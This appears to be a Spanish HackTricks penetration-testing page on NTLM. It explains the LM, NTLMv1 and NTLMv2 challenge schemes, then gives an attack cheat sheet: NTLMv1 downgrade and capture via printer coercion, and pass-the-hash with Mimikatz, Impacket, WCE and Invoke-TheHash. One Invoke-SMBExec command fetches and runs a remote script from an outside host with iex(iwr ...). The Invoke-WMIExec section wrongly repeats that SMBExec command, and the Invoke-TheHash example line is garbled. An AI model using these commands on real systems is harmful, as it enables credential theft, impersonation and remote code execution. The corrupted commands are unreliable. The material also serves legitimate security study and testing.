# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información básica

**Credenciales NTLM**: Nombre de dominio (si lo hay), nombre de usuario y hash de contraseña.

**LM** solo está **habilitado** en **Windows XP y Server 2003** (los hashes LM se pueden descifrar). El hash LM AAD3B435B51404EEAAD3B435B51404EE significa que no se está utilizando LM (es el hash LM de una cadena vacía).

Por defecto se utiliza **Kerberos**, por lo que NTLM solo se utilizará si **no hay ningún Active Directory configurado**, el **dominio no existe**, **Kerberos no funciona** (mala configuración) o el **cliente** que intenta conectarse utiliza la IP en lugar de un nombre de host válido.

Los **paquetes de red** de una **autenticación NTLM** tienen la **cabecera** "**NTLMSSP**".

Los protocolos: LM, NTLMv1 y NTLMv2 son compatibles en la DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 y NTLMv2

Puedes comprobar y configurar qué protocolo se utilizará:

### GUI

Ejecuta _secpol.msc_ -> Directivas locales -> Opciones de seguridad -> Seguridad de red: nivel de autenticación de LAN Manager. Hay 6 niveles (del 0 al 5).

![](<../../.gitbook/assets/image (92).png>)

### Registro

Esto establecerá el nivel 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Posibles valores:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticación de dominio NTLM

1. El **usuario** introduce sus **credenciales**
2. La máquina cliente **envía una solicitud de autenticación** enviando el **nombre de dominio** y el **nombre de usuario**
3. El **servidor** envía el **reto**
4. El **cliente cifra** el **reto** utilizando el hash de la contraseña como clave y lo envía como respuesta
5. El **servidor envía** al **controlador de dominio** el **nombre de dominio, el nombre de usuario, el reto y la respuesta**. Si no hay un Active Directory configurado o el nombre de dominio es el nombre del servidor, las credenciales se **verifican localmente**.
6. El **controlador de dominio verifica si todo es correcto** y envía la información al servidor.

El **servidor** y el **controlador de dominio** pueden crear un **Canal Seguro** a través del servidor **Netlogon** ya que el controlador de dominio conoce la contraseña del servidor (está dentro de la base de datos **NTDS.DIT**).

### Esquema de autenticación NTLM local

La autenticación es como la mencionada **anteriormente pero** el **servidor** conoce el **hash del usuario** que intenta autenticarse dentro del archivo **SAM**. Entonces, en lugar de preguntar al controlador de dominio, el **servidor verificará por sí mismo** si el usuario puede autenticarse.

### Desafío NTLMv1

La **longitud del desafío es de 8 bytes** y la **respuesta es de 24 bytes** de longitud.

El **hash NT (16 bytes)** se divide en **3 partes de 7 bytes cada una** (7B + 7B + (2B+0x00\*5)): la **última parte se llena con ceros**. Luego, el **desafío** se **cifra por separado** con cada parte y los bytes cifrados resultantes se **unen**. Total: 8B + 8B + 8B = 24 bytes.

**Problemas**:

* Falta de **aleatoriedad**
* Las 3 partes se pueden **atacar por separado** para encontrar el hash NT
* **DES es crackeable**
* La 3ª clave está compuesta siempre por **5 ceros**.
* Dado el **mismo desafío**, la **respuesta** será **la misma**. Por lo tanto, puedes dar como **desafío** a la víctima la cadena "**1122334455667788**" y atacar la respuesta utilizada con **tablas arcoíris precalculadas**.

### Ataque NTLMv1

Actualmente es menos común encontrar entornos con Delegación sin restricciones configurada, pero esto no significa que no puedas **abusar de un servicio de cola de impresión** configurado.

Podrías abusar de algunas credenciales/sesiones que ya tienes en el AD para **pedirle a la impresora que se autentique** contra algún **host bajo tu control**. Luego, usando `metasploit auxiliary/server/capture/smb` o `responder`, puedes **establecer el desafío de autenticación en 1122334455667788**, capturar el intento de autenticación y, si se realizó utilizando **NTLMv1**, podrás **crackearlo**.\
Si estás usando `responder`, podrías intentar \*\*usar la bandera `--lm` \*\* para intentar **reducir** la **autenticación**.\
_Ten en cuenta que para esta técnica la autenticación debe realizarse utilizando NTLMv1 (NTLMv2 no es válido)._

Recuerda que la impresora utilizará la cuenta de equipo durante la autenticación, y las cuentas de equipo utilizan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** utilizando **diccionarios** comunes. Pero la autenticación **NTLMv1** utiliza DES ([más información aquí](./#ntlmv1-challenge)), por lo que utilizando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) por ejemplo).

### Desafío NTLMv2

La **longitud del desafío es de 8 bytes** y se envían **2 respuestas**: una es de **24 bytes** de longitud y la longitud de la **otra** es **variable**.

**La primera respuesta** se crea cifrando con **HMAC\_MD5** la **cadena** compuesta por el **cliente y el dominio** y utilizando como **clave** el **hash MD4** del **hash NT**. Luego, el **resultado** se utilizará como **clave** para cifrar utilizando **HMAC\_MD5** el **desafío**. A esto se le agregará **un desafío del cliente de 8 bytes**. Total: 24 B.

La **segunda respuesta** se crea utilizando **varios valores** (un nuevo desafío del cliente, una **marca de tiempo** para evitar **ataques de repetición**...)

Si tienes un **pcap que ha capturado un proceso de autenticación exitoso**, puedes seguir esta guía para obtener el dominio, el nombre de usuario, el desafío y la respuesta e intentar descifrar la contraseña: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Una vez que tienes el hash de la víctima**, puedes usarlo para **suplantarla**.\
Necesitas usar una **herramienta** que **realice la autenticación NTLM utilizando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro del **LSASS**, por lo que cuando se realice cualquier **autenticación NTLM**, se utilizará ese **hash**. La última opción es lo que hace mimikatz.

**Recuerda que también puedes realizar ataques Pass-the-Hash utilizando cuentas de equipo.**

### **Mimikatz**

**Debe ejecutarse como administrador**.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
```
Esto lanzará un proceso que pertenecerá a los usuarios que hayan lanzado mimikatz, pero internamente en LSASS las credenciales guardadas son las que están dentro de los parámetros de mimikatz. Luego, puedes acceder a los recursos de la red como si fueras ese usuario (similar al truco `runas /netonly`, pero no necesitas conocer la contraseña en texto plano).

### Pass-the-Hash desde Linux

Puedes obtener ejecución de código en máquinas Windows usando Pass-the-Hash desde Linux.\
[**Accede aquí para aprender cómo hacerlo.**](../../windows/ntlm/broken-reference/)

### Herramientas compiladas de Impacket para Windows

Puedes descargar los binarios de Impacket para Windows aquí: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (En este caso, necesitas especificar un comando, cmd.exe y powershell.exe no son válidos para obtener una shell interactiva) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Hay varios binarios más de Impacket...

### Invoke-TheHash

Puedes obtener los scripts de PowerShell desde aquí: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

El comando Invoke-WMIExec se utiliza para ejecutar comandos en un host remoto utilizando WMI (Windows Management Instrumentation). Este comando es útil para ejecutar comandos en hosts remotos que no tienen habilitado el protocolo SMB (Server Message Block). 

Para utilizar este comando, se debe especificar el nombre del host remoto, el nombre de usuario y la contraseña. También se puede especificar el dominio si es necesario. 

Ejemplo de uso:

```
Invoke-WMIExec -Target 192.168.1.10 -Username administrator -Password Password123 -Command "net user"
```
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

El cmdlet Invoke-SMBClient se utiliza para conectarse a un servidor SMB y ejecutar comandos en él. Puede ser utilizado para realizar pruebas de penetración y explotación en sistemas Windows que utilizan el protocolo SMB. Este cmdlet es especialmente útil para probar la autenticación NTLM y la enumeración de recursos compartidos SMB.
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

El comando `Invoke-SMBEnum` es una herramienta de enumeración de SMB que se utiliza para recopilar información sobre los recursos compartidos de SMB en una red. Esta herramienta se puede utilizar para identificar los recursos compartidos de SMB que pueden ser vulnerables a ataques de fuerza bruta o de diccionario. También se puede utilizar para identificar los usuarios y grupos que tienen acceso a los recursos compartidos de SMB y para recopilar información sobre los sistemas operativos y las versiones de SMB que se están ejecutando en la red.
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta función es una **mezcla de todas las demás**. Puedes pasar **varios hosts**, **excluir** algunos y **seleccionar** la **opción** que deseas usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si seleccionas **cualquiera** de **SMBExec** y **WMIExec** pero no proporcionas ningún parámetro de _**Command**_, simplemente **verificará** si tienes **suficientes permisos**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Editor de Credenciales de Windows (WCE)

**Debe ser ejecutado como administrador**

Esta herramienta hará lo mismo que mimikatz (modificar la memoria de LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ejecución remota manual de Windows con nombre de usuario y contraseña

{% content-ref url="../lateral-movement/" %}
[movimiento lateral](../lateral-movement/)
{% endcontent-ref %}

## Extracción de credenciales de un host de Windows

**Para obtener más información sobre** [**cómo obtener credenciales de un host de Windows, debe leer esta página**](broken-reference)**.**

## NTLM Relay y Responder

**Lea una guía más detallada sobre cómo realizar estos ataques aquí:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analizar los desafíos NTLM desde una captura de red

**Puede utilizar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegramas**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
